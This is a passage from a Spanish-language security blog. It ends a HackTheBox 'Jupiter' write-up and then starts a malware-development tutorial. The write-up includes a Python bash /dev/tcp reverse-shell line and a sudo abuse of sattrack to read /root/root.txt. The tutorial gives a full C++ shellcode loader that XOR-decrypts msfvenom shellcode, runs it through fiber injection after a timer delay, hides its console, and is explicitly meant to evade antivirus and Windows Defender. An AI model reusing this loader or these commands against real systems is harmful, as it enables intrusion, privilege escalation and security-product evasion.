tcp        0      0 127.0.0.1:39535         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:45609         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
</code></pre></div></div>

<p>Asi que haremos portforwarding de ese puerto:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L 8888:127.0.0.1:8888 juno@10.10.11.216
</code></pre></div></div>

<p>Como era de esperarse, tenemos que usar un token para acceder:</p>

<p><img src="/assets/img/jupiter/4.png" alt="" /></p>

<p>Podemos usar el token que averiguamos anteriormente, pero en caso de que no te funcione, puedes buscar mas tokens en: <code class="language-plaintext highlighter-rouge">/opt/solar-flares/logs</code></p>

<p>Si vemos uno de los archivos, podemos ver que es esta ejecutando un comando, asi que nosotros podemos intentar lo mismo pero una reverse shell</p>

<p><img src="/assets/img/jupiter/5.png" alt="" /></p>

<p>Jupyter al estar trabajando un Python, entonces nos mandaremos un reverse shell usando el modulo <code class="language-plaintext highlighter-rouge">os</code>:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span><span class="p">;</span> <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">bash -c </span><span class="sh">"</span><span class="s">bash -i &gt;&amp; /dev/tcp/&lt;tu_ip&gt;/443 0&gt;&amp;1</span><span class="sh">"'</span><span class="p">)</span>
</code></pre></div></div>

<p>Una vez que lo ejecutemos ya seremos Jovian</p>

<p><img src="/assets/img/jupiter/6.png" alt="" /></p>

<h2 id="jovian-a-root">Jovian a Root</h2>

<p>Si buscamos por binarios que podamos ejectuar como root sin contraseña con <code class="language-plaintext highlighter-rouge">sudo -l</code>, podemos ver uno que se llama <code class="language-plaintext highlighter-rouge">sattrack</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
</code></pre></div></div>

<p>Si lo tratamos de ejecutar nos dira que un archivo de configuracion no se encuentra:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/local/bin/sattrack
Satellite Tracking System
Configuration file has not been found. Please try again!
</code></pre></div></div>

<p>Si vemos el tipo de archivo que es sattrack nos dira que es un binario ELF:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/local/bin/sattrack: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c68bedeeb5dd99903454a774db56a7a533ce7ff4, for GNU/Linux 3.2.0, not stripped
</code></pre></div></div>

<p>Me pase el archivo a mi maquina, y usando rabin2, mostrare los string buscando por archivos de configuracion:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rabin2 -z sattrack | grep -i config
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>491 0x0007bd48 0x0007bd48 16   17   .rodata ascii   /tmp/config.json
</code></pre></div></div>

<p>Podemos ver que esta buscando un archivo JSON en <code class="language-plaintext highlighter-rouge">/tmp/config.json</code>, si buscamos mas informacion de sattrack en internet, podemos ver su repositorio y el archivo json que espera: <a href="https://github.com/arf20/arftracksat/blob/master/config.json">https://github.com/arf20/arftracksat/blob/master/config.json</a></p>

<p>Si seguimos buscando por archivos config.json de sattrack encontraremos uno en <code class="language-plaintext highlighter-rouge">/usr/local/share/sattrack/config.json</code> el cual contiene esto</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
	</span><span class="nl">"tleroot"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/tmp/tle/"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"tlefile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"weather.txt"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"mapfile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/usr/local/share/sattrack/map.json"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"texturefile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/usr/local/share/sattrack/earth.png"</span><span class="p">,</span><span class="w">
	
	</span><span class="nl">"tlesources"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
		</span><span class="s2">"http://celestrak.org/NORAD/elements/weather.txt"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"http://celestrak.org/NORAD/elements/noaa.txt"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&amp;FORMAT=t
le"</span><span class="w">
	</span><span class="p">],</span><span class="w">
	
	</span><span class="nl">"updatePerdiod"</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span><span class="w">
	
	</span><span class="nl">"station"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
		</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"LORCA"</span><span class="p">,</span><span class="w">
		</span><span class="nl">"lat"</span><span class="p">:</span><span class="w"> </span><span class="mf">37.6725</span><span class="p">,</span><span class="w">
		</span><span class="nl">"lon"</span><span class="p">:</span><span class="w"> </span><span class="mf">-1.5863</span><span class="p">,</span><span class="w">
		</span><span class="nl">"hgt"</span><span class="p">:</span><span class="w"> </span><span class="mf">335.0</span><span class="w">
	</span><span class="p">},</span><span class="w">
	
	</span><span class="nl">"show"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
	</span><span class="p">],</span><span class="w">
	
	</span><span class="nl">"columns"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
		</span><span class="s2">"name"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"azel"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"dis"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"geo"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"tab"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"pos"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"vel"</span><span class="w">
	</span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p>Asi que ese lo copiaremos al directorio /tmp</p>

<p>Una vez que tengamos el config.json en /tmp, ejecutaremos el sattrack: <code class="language-plaintext highlighter-rouge">sudo /usr/local/bin/sattrack</code></p>

<p>Vemos como estara intentando descargar recursos de los URL que estan dentro de:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">	</span><span class="nl">"tlesources"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
		</span><span class="s2">"http://celestrak.org/NORAD/elements/weather.txt"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"http://celestrak.org/NORAD/elements/noaa.txt"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&amp;FORMAT=tle"</span><span class="w">
</span><span class="p">]</span><span class="err">,</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/img/jupiter/9.png" alt="" /></p>

<p>Y luego los guardara en <code class="language-plaintext highlighter-rouge">/tmp/tle/</code> como lo indica <code class="language-plaintext highlighter-rouge">"tleroot": "/tmp/tle/",</code></p>

<p>Asi que podriamos hacer que descargue de la misma maquina el archivo de la flag de root y lo guarde en el directorio <code class="language-plaintext highlighter-rouge">/tmp/tle/</code></p>

<p>Editaremos el archivo <code class="language-plaintext highlighter-rouge">config.json</code> y agregaremos esto en <code class="language-plaintext highlighter-rouge">tlesources</code> –&gt; <code class="language-plaintext highlighter-rouge">"file:///root/root.txt"</code>, quedando el archivo asi:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
	</span><span class="nl">"tleroot"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/tmp/tle/"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"tlefile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"weather.txt"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"mapfile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/usr/local/share/sattrack/map.json"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"texturefile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/usr/local/share/sattrack/earth.png"</span><span class="p">,</span><span class="w">
	
	</span><span class="nl">"tlesources"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
		</span><span class="s2">"file:///root/root.txt"</span><span class="w">
	</span><span class="p">],</span><span class="w">
	
	</span><span class="nl">"updatePerdiod"</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span><span class="w">
	
	</span><span class="nl">"station"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
		</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"LORCA"</span><span class="p">,</span><span class="w">
		</span><span class="nl">"lat"</span><span class="p">:</span><span class="w"> </span><span class="mf">37.6725</span><span class="p">,</span><span class="w">
		</span><span class="nl">"lon"</span><span class="p">:</span><span class="w"> </span><span class="mf">-1.5863</span><span class="p">,</span><span class="w">
		</span><span class="nl">"hgt"</span><span class="p">:</span><span class="w"> </span><span class="mf">335.0</span><span class="w">
	</span><span class="p">},</span><span class="w">
	
	</span><span class="nl">"show"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
	</span><span class="p">],</span><span class="w">
	
	</span><span class="nl">"columns"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
		</span><span class="s2">"name"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"azel"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"dis"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"geo"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"tab"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"pos"</span><span class="p">,</span><span class="w">
		</span><span class="s2">"vel"</span><span class="w">
	</span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p>Solo lo ejecutamos y ya tendriamos la flag de root</p>

<p><img src="/assets/img/jupiter/8.png" alt="" /></p>

<p>Eso ha sido todo, gracias por leer ❤</p>

<p><img src="/assets/img/jupiter/waifu.gif" alt="" /></p>]]></content><author><name>c4rta</name></author><category term="HackTheBox" /><category term="SQL injection" /><category term="Movimiento Lateral" /><summary type="html"><![CDATA[Descubriremos un subdomino el cual hace uso de grafana y su API, para la intrusion haremos un SQLi a RCE usando un ruta de la API para realizar consultar, despues haremos movimiento lateral mediante un archivo YAML, despues otro movimiento lateral usando Jupyter el cual nos permitira ejecutar comando y mandarnos una rev shell, y para root abusaremos de un binario donde le indicaremos que descargue el archivo de la flag y lo guarde en un directorio dentro de /tmp]]></summary></entry><entry><title type="html">Inyeccion de shellcode via Fiber injection + Timming attack (SetTimer)</title><link href="http://localhost:4000/maldev/2023/06/16/maldev-bypassAV-fiberInjection.html" rel="alternate" type="text/html" title="Inyeccion de shellcode via Fiber injection + Timming attack (SetTimer)" /><published>2023-06-16T00:00:00-06:00</published><updated>2023-06-16T00:00:00-06:00</updated><id>http://localhost:4000/maldev/2023/06/16/maldev-bypassAV-fiberInjection</id><content type="html" xml:base="http://localhost:4000/maldev/2023/06/16/maldev-bypassAV-fiberInjection.html"><![CDATA[<p class="lead">Desarrollaremos un programa en C++ para inyectar una shellcode cifrada con XOR, ademas evadiremos los antivirus usando la tecnica Fiber Injection y un Timming Attack</p>

<p>Que ondaa, esta vez te voy a enseñar como pude evadir la deteccion de algunos antivirus de antiscan.me, y como evadir el windows defender, para esto use 3 cosas</p>

<ul>
  <li>Una shellcode cifrada con XOR</li>
  <li>La tecnica <code class="language-plaintext highlighter-rouge">fiber injection</code></li>
  <li>Timming attack usando <code class="language-plaintext highlighter-rouge">SetTimer</code></li>
</ul>

<h2 id="fibers-fibras">Fibers (Fibras)</h2>

<p>Como sabras, cuando se ejecuta una aplicacion, el sistema operativo le asigna un proceso dentro de la memoria, por ejemplo, los procesos que ves al abrir al administrador de tereas, pues bien, esos procesos pueden tener otros subprocesos para ejecutar tareas en paralelo, a esto se le conoce como hilos, y es algo clave en la programacion concurrente, sin embargo, dentro de un hilo se puede estar ejecutando otra tarea, y para esto se usan las fibras.</p>

<p>La definicion que nos da la WinAPI, es: <strong>“Una fibra es una unidad de ejecución que la aplicación debe programar manualmente”</strong>, pero la neta no se le entiende casi nada, asi que pongamos algo mas simple, una fibra tambien es conocida como un <code class="language-plaintext highlighter-rouge">hilo liviano</code>, es decir, una unidad de ejeucion que desprende de un hilo, osea que las fibras se ejecutan en el contexto del hilo que las creo, una caracteristica, es que un hilo puede tener varias fibras pero solo una puede ejecutarse una sola a la vez, y nosotros dedicimos cual, amenos que usemos SwitchToFiber para intercalar la ejecución</p>

<h2 id="timming-attack-o-ataques-basados-en-temporizadores">Timming attack o ataques basados en temporizadores</h2>

<p>En el contexto del desarrollo de malware, un timming attack se refiere a suspender o dormir la actividad del malware por un cierto periodo de tiempo, por ejemplo, podemos agregar un delay cuando se ejecute por primera vez, o podemos decirle al malware que ejecute sus acciones en una fecha, hora, dia, y momento especifico, es decir, cada cierto tiempo, para estas implementaciones se usan funciones de temporizado, de ahi su nombre.</p>

<p><strong>Ojo</strong>: esto solo seria en el contexto del malware, tambien hay otro contexto de los timming attack que son los <code class="language-plaintext highlighter-rouge">side channel timing attack</code> o en español, <code class="language-plaintext highlighter-rouge">ataques de canal lateral basados en temporizadores</code>, pero eso es otro tema que no importa en este momento.</p>

<h3 id="fiber-injection">Fiber injection</h3>

<p>Es muy simple, la inyeccion de fibras se refiere a inyectar una fibra en el flujo de ejecucion del proceso, para implementar una inyeccion clasica de este tipo, se usan las funciones.</p>

<ul>
  <li><strong>ConvertThreadToFiber()</strong>: Para convertir el hilo principal en una fibra</li>
  <li><strong>VirtualAlloc()</strong>: Para asignar memoria para la fibra</li>
  <li><strong>CreateFiber()</strong>: Para crear una nueva fibra que contendra la shellcode</li>
  <li><strong>SwitchToFiber()</strong>: Para ejecutar la fibra que tiene la shellcode</li>
</ul>

<p>Llamando a las funciones en ese orden podriamos hacer una fiber injection clasica, pero al fin de cuenta esto es programacion, y cada quien la puede implementar como le sale de su cabecita, o dependiendo del contexto donde se vaya a ejecutar, ahora te voy a explicar como la implemente, primero de pondre todo el codigo y te explicare que es lo que hace</p>

<h4 id="codigo-completo">Codigo completo</h4>
<p>Fue escrito y compilado desde Dev C++</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;winuser.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">fiber_injection</span><span class="p">(){</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
	    <span class="s">"</span><span class="se">\x86\x32\xf9\x9e\x8a\x92\xba\x7a\x7a\x7a\x3b\x2b\x3b\x2a</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x28\x2b\x2c\x32\x4b\xa8\x1f\x32\xf1\x28\x1a\x32\xf1\x28</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x62\x32\xf1\x28\x5a\x32\xf1\x08\x2a\x32\x75\xcd\x30\x30</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x37\x4b\xb3\x32\x4b\xba\xd6\x46\x1b\x06\x78\x56\x5a\x3b</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\xbb\xb3\x77\x3b\x7b\xbb\x98\x97\x28\x3b\x2b\x32\xf1\x28</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x5a\xf1\x38\x46\x32\x7b\xaa\xf1\xfa\xf2\x7a\x7a\x7a\x32</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\xff\xba\x0e\x1d\x32\x7b\xaa\x2a\xf1\x32\x62\x3e\xf1\x3a</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x5a\x33\x7b\xaa\x99\x2c\x32\x85\xb3\x3b\xf1\x4e\xf2\x32</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x7b\xac\x37\x4b\xb3\x32\x4b\xba\xd6\x3b\xbb\xb3\x77\x3b</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x7b\xbb\x42\x9a\x0f\x8b\x36\x79\x36\x5e\x72\x3f\x43\xab</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x0f\xa2\x22\x3e\xf1\x3a\x5e\x33\x7b\xaa\x1c\x3b\xf1\x76</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x32\x3e\xf1\x3a\x66\x33\x7b\xaa\x3b\xf1\x7e\xf2\x32\x7b</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\xaa\x3b\x22\x3b\x22\x24\x23\x20\x3b\x22\x3b\x23\x3b\x20</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x32\xf9\x96\x5a\x3b\x28\x85\x9a\x22\x3b\x23\x20\x32\xf1</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x68\x93\x2d\x85\x85\x85\x27\x32\xc0\x7b\x7a\x7a\x7a\x7a</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x7a\x7a\x7a\x32\xf7\xf7\x7b\x7b\x7a\x7a\x3b\xc0\x4b\xf1</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x15\xfd\x85\xaf\xc1\x8a\xcf\xd8\x2c\x3b\xc0\xdc\xef\xc7</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\xe7\x85\xaf\x32\xf9\xbe\x52\x46\x7c\x06\x70\xfa\x81\x9a</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\x0f\x7f\xc1\x3d\x69\x08\x15\x10\x7a\x23\x3b\xf3\xa0\x85</span><span class="s">"</span>
	    <span class="s">"</span><span class="se">\xaf\x19\x1b\x16\x19\x54\x1f\x02\x1f\x7a</span><span class="s">"</span>
	<span class="p">};</span>

	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
		<span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">)(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="sc">'z'</span><span class="p">);</span>
	<span class="p">}</span>

  	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">shellcode_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

	<span class="n">LPVOID</span> <span class="n">exec_mem</span><span class="p">;</span>
	<span class="n">LPVOID</span> <span class="n">shellcode_fiber</span><span class="p">;</span> 

	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span>
	    <span class="nb">NULL</span><span class="p">,</span>
	    <span class="n">shellcode_len</span><span class="p">,</span>
	    <span class="n">MEM_COMMIT</span><span class="p">,</span>
	    <span class="n">PAGE_EXECUTE_READWRITE</span>
	<span class="p">);</span>

	<span class="n">memcpy</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">);</span>
	<span class="n">shellcode_fiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPFIBER_START_ROUTINE</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

  	<span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>

  	<span class="n">DeleteFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
  	<span class="n">VirtualFree</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MEM_RELEASE</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">VOID</span> <span class="n">CALLBACK</span> <span class="nf">shellcode_routine</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">param</span><span class="p">){</span>
	<span class="n">UINT_PTR</span> <span class="n">timerId</span> <span class="o">=</span> <span class="n">SetTimer</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">20000</span><span class="p">,</span> <span class="p">[](</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">uMsg</span><span class="p">,</span> <span class="n">UINT_PTR</span> <span class="n">idEvent</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwTime</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">fiber_injection</span><span class="p">();</span>
    	<span class="n">KillTimer</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">idEvent</span><span class="p">);</span>
  	<span class="p">});</span>

  	<span class="n">MSG</span> <span class="n">msg</span><span class="p">;</span>
  	<span class="k">while</span> <span class="p">(</span><span class="n">GetMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>	
    	<span class="n">TranslateMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">);</span>
    	<span class="n">DispatchMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">);</span>
  	<span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
	
	<span class="n">HWND</span> <span class="n">ventana_cmd</span> <span class="o">=</span> <span class="n">GetConsoleWindow</span><span class="p">();</span>
	<span class="n">ShowWindow</span><span class="p">(</span><span class="n">ventana_cmd</span><span class="p">,</span> <span class="n">SW_HIDE</span><span class="p">);</span>

	<span class="n">LPVOID</span> <span class="n">main_fiber</span> <span class="o">=</span> <span class="n">ConvertThreadToFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
  	<span class="n">LPVOID</span> <span class="n">shellcode_fiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">shellcode_routine</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  	<span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
  	<span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">main_fiber</span><span class="p">);</span>

  	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="funcion-fiber_injection">Funcion fiber_injection()</h2>

<ul>
  <li>Dentro de la funcion <code class="language-plaintext highlighter-rouge">fiber_injection()</code> tenemos la definicion de nuestra shellcode, esa shellcode fue generada con msfvenom usando crifrado XOR la cual ejecuta el comando <code class="language-plaintext highlighter-rouge">calc.exe</code>: <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/exec CMD=calc.exe -f c --encrypt xor --encrypt-key z</code>.</li>
</ul>

<p>(te recomiendo cambiar la clave del cifrado XOR)</p>

<ul>
  <li>Posteriormente para poder inyectar la shellcode, la debemos de decifrar en tiempo de ejecucion usando la operacion <code class="language-plaintext highlighter-rouge">XOR</code> con la clave de cifrado, y para eso usamos este for:</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
	<span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">)(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="sc">'z'</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Usando <code class="language-plaintext highlighter-rouge">unsigned int shellcode_len = sizeof(shellcode);</code> le estamos diciendo que obtenga el tamaño total en bytes de la shellcode</p>
  </li>
  <li>
    <p>Despues necesitamos asignar memoria para nuestra shellcode, para esto usamos <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>:</p>
  </li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span>
	    <span class="nb">NULL</span><span class="p">,</span>
	    <span class="n">shellcode_len</span><span class="p">,</span>
	    <span class="n">MEM_COMMIT</span><span class="p">,</span>
	    <span class="n">PAGE_EXECUTE_READWRITE</span>
<span class="p">);</span>
</code></pre></div></div>
<p>El primer parametro de la direccion de memoria donde se va a asignar, y le puse NULL para que el sistema operativo lo haga, el segundo parametro es el tamaño en bytes que se van a asignar, y le pase la variable que tiene el tamaño, el tercero es el tipo de asignacion y le puse <code class="language-plaintext highlighter-rouge">MEM_COMMIT</code> para que inicialmente la asignacion contenga puros ceros, y el ultimo argumento son las protecciones de memoria que tendra esa asignacion, y le puse que tenga permisos de ejecucion, escritura, y lectura</p>

<ul>
  <li>Despues se copia la shellcode en la memoria que se asigno con <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>:</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">memcpy</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">);</span>
</code></pre></div></div>

<ul>
  <li>A este punto ya tenemos la memoria lista para nuestra shellcode, ahora debemos de crear una fibra, para eso usamos <code class="language-plaintext highlighter-rouge">CreateFiber</code>:</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode_fiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPFIBER_START_ROUTINE</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p>Lo que esta haciendo es crear una fibra, donde la ejecucion de la fibra comienza desde la direccion que regresa <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, el primer parametro es el tamaño del stack de la fibra, le puse en 0 para que agarre el tamaño por defecto, el segundo parametro es la direccion inicial de la fibra, y observa que el segundo parametro se agrego de esta forma <code class="language-plaintext highlighter-rouge">(LPFIBER_START_ROUTINE)exec_mem</code>, y lo que esta haciendo <code class="language-plaintext highlighter-rouge">LPFIBER_START_ROUTINE</code> es definir un puntero como una rutina, que vendria siendo una funcion de callback a nuestra direccion de inicio de la fibra, la cual se encuentra en <code class="language-plaintext highlighter-rouge">exec_mem</code></p>

<ul>
  <li>Despues de que creamos la fibra, debemos de restaurar el estado de la fibra de la shellcode para ejecutarla, para eso usamos</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
</code></pre></div></div>

<p>El unico parametro que recibe es la direccion de la fibra, la cual se almacena en <code class="language-plaintext highlighter-rouge">shellcode_fiber</code>.</p>

<ul>
  <li>Las ultima dos funciones solo son para eliminar la fibra despues de que se ejecute y liberar memoria</li>
</ul>

<p>Asi que todo lo que se encuentra dentro de la funcion <code class="language-plaintext highlighter-rouge">fiber_injection</code> es solamente para hacer una clasica inyeccion de fibras, a este punto ya se implemento la primera tecnica, y para que esa funcion se ejecute solo hay que llamarla asi <code class="language-plaintext highlighter-rouge">fiber_injection()</code></p>

<hr />

<h2 id="funcion-shellcode_routine-callback">Funcion shellcode_routine (callback)</h2>

<ul>
  <li>
    <p>Despues en el codigo tenemos una funcion callback, donde se implementa la segunda tecnica (timming attack), esta implementacion del callback vendria siendo una implementacio manual de <code class="language-plaintext highlighter-rouge">LPFIBER_START_ROUTINE</code></p>
  </li>
  <li>
    <p>Lo que tenemos primero es un temporizador que agregara un delay de 20 segundos antes de ejecutar la fibra que contiene la shellcode:</p>
  </li>
</ul>

